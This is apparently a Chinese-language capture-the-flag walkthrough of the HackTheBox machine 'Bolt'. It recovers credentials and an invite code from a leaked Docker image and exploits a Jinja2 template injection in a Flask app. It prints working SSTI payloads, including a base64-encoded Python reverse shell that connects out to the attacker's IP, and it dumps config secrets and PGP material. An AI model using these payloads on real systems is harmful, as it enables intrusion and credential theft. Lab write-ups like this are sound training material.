nmap扫描结果

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292037992.png)

把`10.10.11.114    bolt.htb`和`10.10.11.114    passbolt.bolt.htb`加到`/etc/hosts`中

---

[http://passbolt.bolt.htb/uploads/image.tar](http://passbolt.bolt.htb/uploads/image.tar)有个压缩包可以下载

>分析压缩包

在`image/745959c3a65c3899f9e1a5319ee5500f199e0cadf8d487b92e2f297441f8c5cf/config.py`中

```python
# -*- encoding: utf-8 -*-
"""
Copyright (c) 2019 - present AppSeed.us
"""

import os
from   decouple import config

class Config(object):

    basedir    = os.path.abspath(os.path.dirname(__file__))

    # Set up the App SECRET_KEY
    SECRET_KEY = config('SECRET_KEY', default='S#perS3crEt_007')

    # This will create a file in <app> FOLDER
    SQLALCHEMY_DATABASE_URI = 'sqlite:///' + os.path.join(basedir, 'db.sqlite3')
    SQLALCHEMY_TRACK_MODIFICATIONS = False
    MAIL_SERVER = 'localhost'
    MAIL_PORT = 25
    MAIL_USE_TLS = False
    MAIL_USE_SSL = False
    MAIL_USERNAME = None
    MAIL_PASSWORD = None
    DEFAULT_MAIL_SENDER = 'support@bolt.htb'

class ProductionConfig(Config):
    DEBUG = False

    # Security
    SESSION_COOKIE_HTTPONLY  = True
    REMEMBER_COOKIE_HTTPONLY = True
    REMEMBER_COOKIE_DURATION = 3600

    # PostgreSQL database
    SQLALCHEMY_DATABASE_URI = '{}://{}:{}@{}:{}/{}'.format(
        config( 'DB_ENGINE'   , default='postgresql'    ),
        config( 'DB_USERNAME' , default='appseed'       ),
        config( 'DB_PASS'     , default='pass'          ),
        config( 'DB_HOST'     , default='localhost'     ),
        config( 'DB_PORT'     , default=5432            ),
        config( 'DB_NAME'     , default='appseed-flask' )
    )

class DebugConfig(Config):
    DEBUG = True

# Load all possible configurations
config_dict = {
    'Production': ProductionConfig,
    'Debug'     : DebugConfig
}
```

在`image/a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2`中有个`db.sqlite3`

```
sudo apt install sqlite3
sqlite3 db.sqlite3

sqlite> .show
        echo: off
         eqp: off
     explain: auto
     headers: off
        mode: list
   nullvalue: ""
      output: stdout
colseparator: "|"
rowseparator: "\n"
       stats: off
       width: 
    filename: db.sqlite3
sqlite> .database
main: /home/kali/Downloads/image/a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2/db.sqlite3
sqlite> .tables
User
sqlite> .schema User
CREATE TABLE IF NOT EXISTS "User" (
	id INTEGER NOT NULL, 
	username VARCHAR, 
	email VARCHAR, 
	password BLOB, 
	email_confirmed BOOLEAN, 
	profile_update VARCHAR(80), 
	PRIMARY KEY (id), 
	UNIQUE (username), 
	UNIQUE (email)
);
sqlite> select * from User;
1|admin|admin@bolt.htb|$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.||
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292124162.png)

有个hash之后的密码,反查得知其为`deadbolt`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292127456.png)

成功以`admin:deadbolt`登录`bolt.htb`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292129924.png)

但是好像没找到可以利用的点

尝试以`admin@bolt.htb:deadbolt`登录`passbolt.bolt.htb`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292135767.png)

尝试以此进行ssh连接同样失败

推测可能存在其他子域名,用gobuster去爆破`./gobuster vhost -u http://bolt.htb -w /mnt/hgfs/Exploits/subdomains-top1million-110000.txt -t 100`

```
Found: demo.bolt.htb (Status: 302) [Size: 219]
Found: mail.bolt.htb (Status: 200) [Size: 4943]
```

`demo.bolt.htb`跟`bolt.htb`的登录框一样,但是无法登录

在[注册页面](http://demo.bolt.htb/register)多了一个邀请码

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292145113.png)

全局搜素`Invite Code`,发现其在`image/41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/forms.py`中出现

```python
# -*- encoding: utf-8 -*-
"""
Copyright (c) 2019 - present AppSeed.us
"""

from flask_wtf import FlaskForm
from wtforms import TextField, PasswordField
from wtforms.validators import InputRequired, Email, DataRequired

## login and registration

class LoginForm(FlaskForm):
    username = TextField    ('Username', id='username_login'   , validators=[DataRequired()])
    password = PasswordField('Password', id='pwd_login'        , validators=[DataRequired()])

class CreateAccountForm(FlaskForm):
    username = TextField('Username'     , id='username_create' , validators=[DataRequired()])
    email    = TextField('Email'        , id='email_create'    , validators=[DataRequired(), Email()])
    password = PasswordField('Password' , id='pwd_create'      , validators=[DataRequired()])
    invite_code = TextField('Invite Code', id='invite_code'    , validators=[DataRequired()])
```

而在`routes.py`中定义了`Invite Code`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292148716.png)

```python
@blueprint.route('/register', methods=['GET', 'POST'])
def register():
    login_form = LoginForm(request.form)
    create_account_form = CreateAccountForm(request.form)
    if 'register' in request.form:

        username  = request.form['username']
        email     = request.form['email'   ]
        code	  = request.form['invite_code']
        if code != 'XNSS-HSJW-3NGU-8XTJ':
            return render_template('code-500.html')
        data = User.query.filter_by(email=email).first()
        if data is None and code == 'XNSS-HSJW-3NGU-8XTJ':
            # Check usename exists
            user = User.query.filter_by(username=username).first()
            if user:
                return render_template( 'accounts/register.html', 
                                    msg='Username already registered',
                                    success=False,
                                    form=create_account_form)

            # Check email exists
            user = User.query.filter_by(email=email).first()
            if user:
                return render_template( 'accounts/register.html', 
                                    msg='Email already registered', 
                                    success=False,
                                    form=create_account_form)

            # else we can create the user
            user = User(**request.form)
            db.session.add(user)
            db.session.commit()

            return render_template( 'accounts/register.html', 
                                msg='User created please <a href="/login">login</a>', 
                                success=True,
                                form=create_account_form)

    else:
        return render_template( 'accounts/register.html', form=create_account_form)
```

成功注册并登录

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292150051.png)

`extras`下面挺多功能的,但是好像只是个前端???

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292154767.png)

`mail.bolt.htb`如下

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292139397.png)

可以用新注册的用户`test:test`进行登录,从数据库中得到的`admin:deadbolt`反而不可以...

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292157064.png)

版本是`Roundcube Webmail 1.4.6`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292306133.png)

有个sql注入的CVE[CVE-2021-44026](https://www.cvedetails.com/cve/CVE-2021-44026/),但是没找到利用方式...

`demo.bolt.htb`用到了`jinja2`和`flask`猜测可能存在SSTI模板注入

在`image`中全局搜索`render_template_string`

在`image/41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/home/routes.py`中调用了`render_template_string`,因此可能存在模板注入

```python
@blueprint.route("/example-profile", methods=['GET', 'POST'])
@login_required
def profile():
    """Profiles"""
    if request.method == 'GET':
        return render_template('example-profile.html', user=user,current_user=current_user)
    else:
        """Experimental Feature"""
        cur_user = current_user
        user = current_user.username
        name = request.form['name']
        experience = request.form['experience']
        skills = request.form['skills']
        msg = Message(
                recipients=[f'{cur_user.email}'],
                sender = 'support@example.com',
                reply_to = 'support@example.com',
                subject = "Please confirm your profile changes"
            )
        try:
            cur_user.profile_update = name
        except:
            return render_template('page-500.html')
        db.session.add(current_user)
        db.session.commit()
        token = ts.dumps(user, salt='changes-confirm-key')
        confirm_url = url_for('home_blueprint.confirm_changes',token=token,_external=True)
        html = render_template('emails/confirm-changes.html',confirm_url=confirm_url)
        msg.html = html
        mail.send(msg)
        return render_template('index.html')

@blueprint.route('/confirm/changes/<token>')
def confirm_changes(token):
    """Confirmation Token"""
    try:
        email = ts.loads(token, salt="changes-confirm-key", max_age=86400)
    except:
        abort(404)
    user = User.query.filter_by(username=email).first_or_404()
    name = user.profile_update
    template = open('templates/emails/update-name.html', 'r').read()
    msg = Message(
            recipients=[f'{user.email}'],
            sender = 'support@example.com',
            reply_to = 'support@example.com',
            subject = "Your profile changes have been confirmed."
        )
    msg.html = render_template_string(template % name)
    mail.send(msg)

    return render_template('index.html')
```

`forms.py`

```python
class UpdateProfileForm(FlaskForm):
    name = TextField('Name', id='name', validators=[DataRequired()])
    experience = TextField('Experience', id='experience', validators=[DataRequired()])
    skills = TextField('Skills', id='skills', validators=[DataRequired()])
```

`templates/emails/update-name.html`

`examples-profile.html`

```html
<div class="tab-pane" id="settings">
  <p>Email verification is required in order to update personal information.</p>
  <form class="form-horizontal" action="/example-profile" method="POST">
    <div class="form-group row">
      <label for="inputName2" class="col-sm-2 col-form-label">Name</label>
      <div class="col-sm-10">
        <input type="text" class="form-control" id="inputName2" name="name" placeholder="Name">
      </div>
    </div>
    <div class="form-group row">
      <label for="inputExperience" class="col-sm-2 col-form-label">Experience</label>
      <div class="col-sm-10">
        <textarea class="form-control" id="inputExperience" name="experience" placeholder="Experience"></textarea>
      </div>
    </div>
    <div class="form-group row">
      <label for="inputSkills" class="col-sm-2 col-form-label">Skills</label>
      <div class="col-sm-10">
        <input type="text" class="form-control" id="inputSkills" name="skills" placeholder="Skills">
      </div>
    </div>
    <div class="form-group row">
      <div class="offset-sm-2 col-sm-10">
        <div class="checkbox">
          <label>
            <input type="checkbox"> I agree to the <a href="#">terms and conditions</a>
          </label>
        </div>
      </div>
    </div>
    <div class="form-group row">
      <div class="offset-sm-2 col-sm-10">
        <button type="submit" class="btn btn-danger">Submit</button>
      </div>
    </div>
  </form>
</div>
```

```html
<html>
	<body>
		<p> %s </p>
		<p> This e-mail serves as confirmation of your profile username changes.</p>
	</body>
</html>
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292336044.png)

尝试在这里进行模板注入

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201301414778.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201301415951.png)

然后根据网页提示去邮箱`mail.bolt.htb`检查邮件

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201301416844.png)

点击确认连接,邮箱收到新的邮件其中包含模板注入的结果

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201301417463.png)

`{{"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__['os'].popen('whoami').read()}}`返回`www-data`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201301420520.png)

反弹shell

```python
{{"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__['os'].popen('echo "aW1wb3J0IHNvY2tldAppbXBvcnQgc3VicHJvY2VzcwppbXBvcnQgb3MKaXA9IjEwLjEwLjE2LjciCnBvcnQ9ODAwMApzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKQpzLmNvbm5lY3QoKGlwLHBvcnQpKQpvcy5kdXAyKHMuZmlsZW5vKCksMCkKb3MuZHVwMihzLmZpbGVubygpLDEpCm9zLmR1cDIocy5maWxlbm8oKSwyKQpwPXN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKQoKI3B5dGhvbjMgLWMgJ2ltcG9ydCBwdHk7cHR5LnNwYXduKCIvYmluL2Jhc2giKScK" | base64 -d > /tmp/a.py').read()}}
{{"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__['os'].popen('python3 /tmp/a.py').read()}}
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201301724933.png)

`/var/www/demo/config.py`

```python
"""Flask Configuration"""
#SQLALCHEMY_DATABASE_URI = 'sqlite:///database.db'
SQLALCHEMY_DATABASE_URI = 'mysql://bolt_dba:dXUUHSW9vBpH5qRB@localhost/boltmail'
SQLALCHEMY_TRACK_MODIFICATIONS = True
SECRET_KEY = 'kreepandcybergeek'
MAIL_SERVER = 'localhost'
MAIL_PORT = 25
MAIL_USE_TLS = False
MAIL_USE_SSL = False
#MAIL_DEBUG = app.debug
MAIL_USERNAME = None
MAIL_PASSWORD = None
DEFAULT_MAIL_SENDER = 'support@bolt.htb'
```

`/var/www/roundcube/config/config.inc.php`

```php
<?php
$config['db_dsnw'] = 'mysql://roundcubeuser:WXg5He2wHt4QYHuyGET@localhost/roundcube';
$config['smtp_log'] = false;
$config['des_key'] = 'tdqy62YPNdGEeohXtJ2160bX';
$config['trash_mbox'] = '';
...
```

```
find / -user root -perm -4000 -print 2>/dev/null
/opt/google/chrome/chrome-sandbox
/usr/sbin/pppd
/usr/lib/xorg/Xorg.wrap
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/vmware-user-suid-wrapper
/usr/bin/umount
/usr/bin/fusermount
/usr/bin/mount
/usr/bin/su
/usr/bin/sudo
/usr/bin/chsh
```

传个`pspy`上去看看有没有特别的进程

```
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2022/01/30 04:30:01 [32;1mCMD: UID=127  PID=964    | /usr/sbin/mysqld [0m
2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=948    | dovecot/config [0m
2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=945    | dovecot/log [0m
2022/01/30 04:30:01 [36;1mCMD: UID=129  PID=944    | dovecot/anvil [0m
2022/01/30 04:30:01 [36;1mCMD: UID=116  PID=911    | /usr/sbin/kerneloops [0m
2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=909    | /sbin/agetty -o -p -- \u --noclear tty1 linux [0m
2022/01/30 04:30:01 [36;1mCMD: UID=116  PID=904    | /usr/sbin/kerneloops --test [0m
2022/01/30 04:30:01 [36;1mCMD: UID=33   PID=886    | php-fpm: pool www                                                             [0m
2022/01/30 04:30:01 [35;1mCMD: UID=120  PID=877    | /usr/bin/whoopsie -f [0m
2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=871    | /usr/sbin/dovecot -F [0m
2022/01/30 04:30:01 [36;1mCMD: UID=33   PID=867    | nginx: worker process                            [0m
2022/01/30 04:30:01 [36;1mCMD: UID=33   PID=866    | nginx: worker process                            [0m
2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=865    | nginx: master process /usr/sbin/nginx -g daemon on; master_process on; [0m
2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=853    | sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups [0m
2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=850    | php-fpm: master process (/etc/php/7.4/fpm/php-fpm.conf)                       [0m
2022/01/30 04:30:01 [36;1mCMD: UID=33   PID=846    | /usr/bin/python3 /usr/local/bin/gunicorn wsgi:app [0m
2022/01/30 04:30:01 [36;1mCMD: UID=33   PID=845    | /usr/bin/python3 /usr/local/bin/gunicorn wsgi:app [0m
2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=768    | /usr/sbin/ModemManager [0m
2022/01/30 04:30:01 [35;1mCMD: UID=115  PID=682    | avahi-daemon: chroot helper [0m
2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=676    | /usr/bin/vmtoolsd [0m
2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=667    | /sbin/wpa_supplicant -u -s -O /run/wpa_supplicant [0m
2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=651    | /lib/systemd/systemd-logind [0m
2022/01/30 04:30:01 [35;1mCMD: UID=104  PID=644    | /usr/sbin/rsyslogd -n -iNONE [0m
2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=633    | /usr/lib/policykit-1/polkitd --no-debug [0m
2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=630    | /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers [0m
2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=625    | /usr/sbin/irqbalance --foreground [0m
2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=606    | /usr/sbin/NetworkManager --no-daemon [0m
2022/01/30 04:30:01 [34;1mCMD: UID=103  PID=605    | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only [0m
2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=604    | /usr/sbin/cron -f [0m
2022/01/30 04:30:01 [35;1mCMD: UID=115  PID=603    | avahi-daemon: running [bolt.local] [0m
2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=598    | /usr/sbin/acpid [0m
2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=590    | /usr/bin/VGAuthService [0m
2022/01/30 04:30:01 [35;1mCMD: UID=102  PID=539    | /lib/systemd/systemd-timesyncd [0m
2022/01/30 04:30:01 [36;1mCMD: UID=101  PID=538    | /lib/systemd/systemd-resolved [0m
2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=454    | vmware-vmblock-fuse /run/vmblock-fuse -o rw,subtype=vmware-vmblock,default_permissions,allow_other,dev,suid [0m
2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=416    | /lib/systemd/systemd-udevd [0m
2022/01/30 04:30:01 [36;1mCMD: UID=33   PID=3985   | ./pspy64s [0m
2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=3984   | dovecot/auth -w [0m
2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=396    | /lib/systemd/systemd-journald [0m
2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=3901   | [0m
2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=3803   | [0m
2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=3588   | [0m
2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=3495   | [0m
2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=3492   | [0m
2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=3462   | /usr/lib/udisks2/udisksd [0m
2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=3456   | /usr/lib/upower/upowerd [0m
2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=3449   | /usr/libexec/fwupd/fwupd [0m
2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=2915   | [0m
2022/01/30 04:30:01 [36;1mCMD: UID=33   PID=2822   | php-fpm: pool www                                                             [0m
2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=2683   | [0m
2022/01/30 04:30:01 [36;1mCMD: UID=33   PID=2460   | ./pspy64s [0m
2022/01/30 04:30:01 [36;1mCMD: UID=33   PID=2442   | ./pspy64s [0m
2022/01/30 04:30:01 [36;1mCMD: UID=33   PID=2388   | ./pspy64s [0m
2022/01/30 04:30:01 [36;1mCMD: UID=33   PID=2387   | /bin/sh -c cd /tmp;./pspy64s;echo 50437e61;pwd;echo c6d24 [0m
2022/01/30 04:30:01 [36;1mCMD: UID=33   PID=2386   | sh -c /bin/sh -c "cd "/tmp";./pspy64s;echo 50437e61;pwd;echo c6d24" 2>&1 [0m
2022/01/30 04:30:01 [36;1mCMD: UID=33   PID=2353   | ./pspy64 [0m
2022/01/30 04:30:01 [36;1mCMD: UID=33   PID=2352   | /bin/sh -c cd /tmp;./pspy64 > /tmp/pspy64.out;echo 50437e61;pwd;echo c6d24 [0m
2022/01/30 04:30:01 [36;1mCMD: UID=33   PID=2351   | sh -c /bin/sh -c "cd "/tmp";./pspy64 > /tmp/pspy64.out;echo 50437e61;pwd;echo c6d24" 2>&1 [0m
2022/01/30 04:30:01 [36;1mCMD: UID=33   PID=2189   | php-fpm: pool www                                                             [0m
2022/01/30 04:30:01 [36;1mCMD: UID=33   PID=2187   | php-fpm: pool www                                                             [0m
2022/01/30 04:30:01 [36;1mCMD: UID=33   PID=1904   | /usr/bin/python3 /usr/local/bin/gunicorn wsgi:app [0m
2022/01/30 04:30:01 [36;1mCMD: UID=33   PID=1900   | /bin/bash [0m
2022/01/30 04:30:01 [36;1mCMD: UID=33   PID=1899   | python3 -c import pty;pty.spawn("/bin/bash") [0m
2022/01/30 04:30:01 [36;1mCMD: UID=33   PID=1856   | /bin/sh -i [0m
2022/01/30 04:30:01 [36;1mCMD: UID=33   PID=1855   | python3 /tmp/a.py [0m
2022/01/30 04:30:01 [36;1mCMD: UID=33   PID=1854   | /bin/sh -c python3 /tmp/a.py [0m
2022/01/30 04:30:01 [36;1mCMD: UID=129  PID=1782   | dovecot/auth [0m
2022/01/30 04:30:01 [36;1mCMD: UID=33   PID=1390   | php-fpm: pool www                                                             [0m
2022/01/30 04:30:01 [36;1mCMD: UID=129  PID=1384   | dovecot/stats [0m
2022/01/30 04:30:01 [36;1mCMD: UID=33   PID=1347   | gpg-agent --homedir /var/lib/passbolt/.gnupg --use-standard-socket --daemon [0m
2022/01/30 04:30:01 [31;1mCMD: UID=128  PID=1251   | qmgr -l -t unix -u [0m
2022/01/30 04:30:01 [31;1mCMD: UID=128  PID=1250   | pickup -l -t unix -u -c [0m
2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=1249   | /usr/lib/postfix/sbin/master -w [0m
2022/01/30 04:30:01 [36;1mCMD: UID=33   PID=1016   | /usr/bin/python3 /usr/local/bin/gunicorn wsgi:app [0m
2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=1      | /sbin/init splash [0m
```

注意到`gpg-agent --homedir /var/lib/passbolt/.gnupg --use-standard-socket --daemon`,好像是跟密钥管理有关的

`find /* | grep -i passbolt > /dev/shm/find`

主要有以下三个目录

```
/etc/passbolt/
/usr/share/php/passbolt/
/var/lib/passbolt/
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201301941995.png)

`/etc/passbolt/passbolt.php`

```php
<?php
return [
    'App' => [
        // A base URL to use for absolute links.
        // The url where the passbolt instance will be reachable to your end users.
        // This information is need to render images in emails for example
        'fullBaseUrl' => 'https://passbolt.bolt.htb',
    ],

    // Database configuration.
    'Datasources' => [
        'default' => [
            'host' => 'localhost',
            'port' => '3306',
            'username' => 'passbolt',
            'password' => 'rT2;jW7<eY8!dX8}pQ8%',
            'database' => 'passboltdb',
        ],
    ],

    // Email configuration.
    'EmailTransport' => [
        'default' => [
            'host' => 'localhost',
            'port' => 587,
            'username' => null,
            'password' => null,
            // Is this a secure connection? true if yes, null if no.
            'tls' => true,
            //'timeout' => 30,
            //'client' => null,
            //'url' => null,
        ],
    ],
    'Email' => [
        'default' => [
            // Defines the default name and email of the sender of the emails.
            'from' => ['localhost@bolt.htb' => 'localhost'],
            //'charset' => 'utf-8',
            //'headerCharset' => 'utf-8',
        ],
    ],
    'passbolt' => [
        // GPG Configuration.
        // The keyring must to be owned and accessible by the webserver user.
        // Example: www-data user on Debian
        'gpg' => [
            // Main server key.
            'serverKey' => [
                // Server private key fingerprint.
                'fingerprint' => '59860A269E803FA094416753AB8E2EFB56A16C84',
                'public' => CONFIG . DS . 'gpg' . DS . 'serverkey.asc',
                'private' => CONFIG . DS . 'gpg' . DS . 'serverkey_private.asc',
            ],
        ],
        'registration' => [
            'public' => false,
        ],
        'ssl' => [
            'force' => true,
        ]
    ],
];
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201302133323.png)

```
-----BEGIN PGP MESSAGE-----
Version: OpenPGP.js v4.10.9
Comment: https://openpgpjs.org

wcBMA/ZcqHmj13/kAQgAkS/2GvYLxglAIQpzFCydAPOj6QwdVV5BR17W5psc
g/ajGlQbkE6wgmpoV7HuyABUjgrNYwZGN7ak2Pkb+/3LZgtpV/PJCAD030kY
pCLSEEzPBiIGQ9VauHpATf8YZnwK1JwO/BQnpJUJV71YOon6PNV71T2zFr3H
oAFbR/wPyF6Lpkwy56u3A2A6lbDb3sRl/SVIj6xtXn+fICeHjvYEm2IrE4Px
l+DjN5Nf4aqxEheWzmJwcyYqTsZLMtw+rnBlLYOaGRaa8nWmcUlMrLYD218R
zyL8zZw0AEo6aOToteDPchiIMqjuExsqjG71CO1ohIIlnlK602+x7/8b7nQp
edLA7wF8tR9g8Tpy+ToQOozGKBy/auqOHO66vA1EKJkYSZzMXxnp45XA38+u
l0/OwtBNuNHreOIH090dHXx69IsyrYXt9dAbFhvbWr6eP/MIgh5I0RkYwGCt
oPeQehKMPkCzyQl6Ren4iKS+F+L207kwqZ+jP8uEn3nauCmm64pcvy/RZJp7
FUlT7Sc0hmZRIRQJ2U9vK2V63Yre0hfAj0f8F50cRR+v+BMLFNJVQ6Ck3Nov
8fG5otsEteRjkc58itOGQ38EsnH3sJ3WuDw8ifeR/+K72r39WiBEiE2WHVey
5nOF6WEnUOz0j0CKoFzQgri9YyK6CZ3519x3amBTgITmKPfgRsMy2OWU/7tY
NdLxO3vh2Eht7tqqpzJwW0CkniTLcfrzP++0cHgAKF2tkTQtLO6QOdpzIH5a
Iebmi/MVUAw3a9J+qeVvjdtvb2fKCSgEYY4ny992ov5nTKSH9Hi1ny2vrBhs
nO9/aqEQ+2tE60QFsa2dbAAn7QKk8VE2B05jBGSLa0H7xQxshwSQYnHaJCE6
TQtOIti4o2sKEAFQnf7RDgpWeugbn/vphihSA984
=P38i
-----END PGP MESSAGE-----
```

得到一个用加密后的信息,发送人为`eddie`,将该文件保存为`file.enc`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201301943343.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201301947641.png)

`eddie@bolt.htb`的pgp公钥

```
-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: OpenPGP.js v4.10.9
Comment: https://openpgpjs.org

xsBNBGA4G2EBCADbpIGoMv+O5sxsbYX3ZhkuikEiIbDL8JRvLX/r1KlhWlTi
fjfUozTU9a0OLuiHUNeEjYIVdcaAR89lVBnYuoneAghZ7eaZuiLz+5gaYczk
cpRETcVDVVMZrLlW4zhA9OXfQY/d4/OXaAjsU9w+8ne0A5I0aygN2OPnEKhU
RNa6PCvADh22J5vD+/RjPrmpnHcUuj+/qtJrS6PyEhY6jgxmeijYZqGkGeWU
+XkmuFNmq6km9pCw+MJGdq0b9yEKOig6/UhGWZCQ7RKU1jzCbFOvcD98YT9a
If70XnI0xNMS4iRVzd2D4zliQx9d6BqEqZDfZhYpWo3NbDqsyGGtbyJlABEB
AAHNHkVkZGllIEpvaG5zb24gPGVkZGllQGJvbHQuaHRiPsLAjQQQAQgAIAUC
YDgbYQYLCQcIAwIEFQgKAgQWAgEAAhkBAhsDAh4BACEJEBwnQaPcO0q9FiEE
30Jrx6Sor1jlDtoOHCdBo9w7Sr35DQf9HZOFYE3yug2TuEJY7q9QfwNrWhfJ
HmOwdM1kCKV5XnBic356DF/ViT3+pcWfIbWT8giYIZ/2qYfAd74S+gMKBim8
wBAH0J7WcnUI+py/zXxapGxBF0ufJtqrHmPaKsNaQVCEV3dDzTqlVRi0vfOD
Cm6kt3E8f8GPYK9Mh21gPjnhoPE1s23NzmBUiDt6wjZ2dOQ2cVagVnf6PyHM
WZLqUm8nQY342t3+AA6SFTw/YpwPPvjtZBBHf95BrSbpCE5Bjar9UyB+14x6
OUcWhkJu7QgySrCwAg2aKIBzsfWovcVTe9Rkpq/ty1tYOklT9kn75D9ttDF4
U8+Qz61kTICf987ATQRgOBthAQgAmlgcw3DqVzEBa5k9djPsUTJWOKVY5uox
oBp6X0H9njR9Ufb2XtmxZUUdV/uhtbnM0lSlNkeNNBX4c/Qny88vfkgb66xc
oOo4q+fNCEZfCmcS2AwMsUlzaPDQjowp4V+mWSc8JXq4GXOd/mrooibtiEdt
vK4pzMdvwGCykFqugyRDLksc1hfDYU+s5R42TNiMdW7OwYAplnOjgExOH8f1
lXVkqbsq5p54TbHe+0SdlfH5pJf4Gfwqj6dQlkSf3DMeEnByxEZX3imeKGrC
UmwLN4NHMeUs5EXuLnufut9aTMhbw/tetTtUXTHFk/zc7EhZDR1d3mkDV83c
tEUh6BuElwARAQABwsB2BBgBCAAJBQJgOBthAhsMACEJEBwnQaPcO0q9FiEE
30Jrx6Sor1jlDtoOHCdBo9w7Sr3+HQf/Qhrj6znyGkLbj9uUv0S1Q5fFx78z
5qEXRe4rvFC3APYE8T5/AzW7XWRJxRxzgDQB5yBRoGEuL49w4/UNwhGUklb8
IOuffRTHMPZxs8qVToKoEL/CRpiFHgoqQ9dJPJx1u5vWAX0AdOMvcCcPfVjc
PyHN73YWejb7Ji82CNtXZ1g9vO7D49rSgLoSNAKghJIkcG+GeAkhoCeU4BjC
